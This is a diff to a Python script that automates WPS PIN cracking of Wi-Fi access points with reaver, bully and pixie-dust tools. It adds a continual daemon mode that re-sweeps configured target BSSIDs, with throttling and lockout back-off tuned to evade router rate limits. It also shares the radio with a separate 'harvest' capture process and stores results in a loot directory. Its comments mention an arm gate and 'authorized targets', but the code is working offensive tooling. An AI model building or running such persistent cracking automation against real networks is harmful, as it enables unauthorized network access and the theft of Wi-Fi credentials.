@@ -43,9 +43,15 @@ REAVER_DELAY       = 15       # -d : seconds between PIN attempts (gentle)
 REAVER_THROTTLE    = "3:60"   # -r : after 3 attempts, sleep 60s
 LOCK_DELAY         = 300      # --lock-delay : if a lock is seen, wait this long (we ABORT instead)
 PIXIE_TIMEOUT      = 300      # per pixie tool
-RADIO_WAIT_MAX     = 360      # max seconds to wait for the harvest to yield the radio
+# The harvest holds the radio for a whole capture pass (can be ~40 min when no client is present),
+# then idles for its cooldown. WPS is opportunistic and only needs the radio briefly a few times a
+# day, so it waits patiently for that cooldown window rather than ever interrupting a capture.
+RADIO_WAIT_MAX     = 4200     # max seconds to wait for the harvest to yield the radio (~1 macro-cycle)
+RADIO_POLL         = 30       # seconds between radio-lock retries while waiting
 RETRY_COOLDOWN     = 21600    # 6h : skip a target that recently yielded nothing (no result)
 LOCK_COOLDOWN      = 86400    # 24h : much longer back-off after any lock/rate-limit signal
+CYCLE_IDLE         = 1800     # --daemon: seconds to idle between full target sweeps
+GATE_POLL          = 300      # --daemon: how often to re-check the arm gate while dormant
 
 REQUIRED_TOOLS = ("wash", "reaver", "bully", "iw", "ip")
 
@@ -92,7 +98,8 @@ def run(cmd, timeout=60):
 
 def load_conf():
     global IFACE, TARGETS, WPS_ENABLED, ONLINE_ENABLED, RETRY_COOLDOWN, LOCK_COOLDOWN
-    global REAVER_DELAY, REAVER_THROTTLE, ONLINE_MAX_SECONDS
+    global REAVER_DELAY, REAVER_THROTTLE, ONLINE_MAX_SECONDS, CYCLE_IDLE
+    TARGETS = []                              # reset so load_conf is idempotent (re-read each daemon cycle)
     path = next((p for p in CONF_PATHS if os.path.exists(p)), None)
     if not path:
         log("FATAL: no wpacrack.conf"); sys.exit(2)
@@ -110,6 +117,7 @@ def load_conf():
     if "wps_reaver_delay"   in cfg: REAVER_DELAY   = int(cfg["wps_reaver_delay"])
     if "wps_reaver_throttle" in cfg: REAVER_THROTTLE = cfg["wps_reaver_throttle"]
     if "wps_online_max_seconds" in cfg: ONLINE_MAX_SECONDS = int(cfg["wps_online_max_seconds"])
+    if "wps_cycle_idle" in cfg: CYCLE_IDLE = int(cfg["wps_cycle_idle"])
     for tok in cfg.get("targets", "").split(","):
         tok = tok.strip()
         if ":" in tok:
@@ -118,6 +126,21 @@ def load_conf():
                 TARGETS.append((bssid.strip().upper(), int(ch.strip())))
     if not TARGETS:
         log("FATAL: no valid targets in wpacrack.conf — refusing to run"); sys.exit(2)
+
+
+def _armed_now():
+    """Cheap re-read of just the arm gate (so a long radio wait still honours `wps-disarm`)."""
+    path = next((p for p in CONF_PATHS if os.path.exists(p)), None)
+    if not path:
+        return False
+    try:
+        for line in open(path):
+            line = line.strip()
+            if line.lower().startswith("wps_enabled") and "=" in line:
+                return _truthy(line.split("=", 1)[1])
+    except Exception:
+        pass
+    return False
 
 
 def preflight():
@@ -140,8 +163,13 @@ def acquire_radio():
         try:
             fcntl.flock(_radio_fd, fcntl.LOCK_EX | fcntl.LOCK_NB); return True
         except OSError:
-            set_status("wait-radio", "harvest holds the radio; waiting to coexist")
-            time.sleep(10)
+            if not _armed_now():
+                log("disarmed while waiting for the radio — standing down (no frames sent)")
+                return False
+            waited = int(time.time() - t0)
+            set_status("wait-radio", f"harvest capturing; waiting {waited}s for spare radio time (never interrupts capture)")
+            time.sleep(RADIO_POLL)
+    log("radio stayed busy past the wait budget — harvest is busy; will retry next cycle")
     return False
 
 def release_radio():
@@ -346,18 +374,11 @@ def attack(bssid, ch):
     return False
 
 
-def main():
-    os.makedirs(LOOT, exist_ok=True)
-    os.makedirs(STATE, exist_ok=True)
-    load_conf()
-    if not WPS_ENABLED:
-        set_status("disabled", "wps_enabled is not true in wpacrack.conf — WPS stays dormant (no frames sent)")
-        log("wps_enabled != true -> exiting without transmitting. Set 'wps_enabled = true' in wpacrack.conf to arm.")
-        return
-    preflight()
-    set_status("init", f"targets={TARGETS}")
+def sweep():
+    """One full pass over the authorized targets under the shared radio lock. Assumes the arm
+    gate has already passed and preflight() has run. Yields the radio to the harvest afterwards."""
     if not acquire_radio():
-        log("could not acquire the radio within budget (harvest busy) — will retry next timer. STOP.")
+        log("could not acquire the radio within budget (harvest busy) — will retry next sweep. STOP.")
         return
     try:
         for bssid, ch in TARGETS:
@@ -369,8 +390,53 @@ def main():
     finally:
         # leave wlan1 in monitor mode for the harvest; just drop the radio lock
         release_radio()
-        set_status("done", "radio released back to harvest (monitor mode preserved)")
+        set_status("idle", "radio released back to harvest (monitor mode preserved)")
+
+
+def run_once():
+    """A single pass (used by the manual `wps-run` helper). Honours the arm gate + cooldowns."""
+    os.makedirs(LOOT, exist_ok=True)
+    os.makedirs(STATE, exist_ok=True)
+    load_conf()
+    if not WPS_ENABLED:
+        set_status("disabled", "wps_enabled is not true in wpacrack.conf — WPS stays dormant (no frames sent)")
+        log("wps_enabled != true -> exiting without transmitting. Set 'wps_enabled = true' in wpacrack.conf to arm.")
+        return
+    preflight()
+    set_status("init", f"targets={TARGETS}")
+    sweep()
+
+
+def daemon_loop():
+    """Continual active service: stay up, re-read the arm gate every cycle (so `wps-arm`/`wps-disarm`
+    take effect without a restart), and sweep the targets whenever armed. The per-target cooldown
+    markers (6h no-result / 24h after a lock) mean 'continual' never means 'hammering' — each target
+    is attempted at most once per cooldown window. Coexists with the harvest via the shared radio
+    lock; both stay in monitor mode throughout."""
+    os.makedirs(LOOT, exist_ok=True)
+    os.makedirs(STATE, exist_ok=True)
+    preflighted = False
+    log("wps_attack daemon starting (continual, lockout-safe, harvest-coexisting)")
+    while True:
+        try:
+            load_conf()
+            if not WPS_ENABLED:
+                set_status("dormant", "wps_enabled=false — service up but idle (no frames sent). Arm with `sudo wps-arm`.")
+                time.sleep(GATE_POLL)
+                continue
+            if not preflighted:
+                preflight(); preflighted = True
+            set_status("armed", f"sweeping {len(TARGETS)} target(s); cycle idle {CYCLE_IDLE}s")
+            sweep()
+        except SystemExit:
+            raise
+        except Exception:
+            import traceback; log("daemon cycle error:\n" + traceback.format_exc())
+        time.sleep(CYCLE_IDLE)
 
 
 if __name__ == "__main__":
-    main()
+    if "--daemon" in sys.argv:
+        daemon_loop()
+    else:
+        run_once()
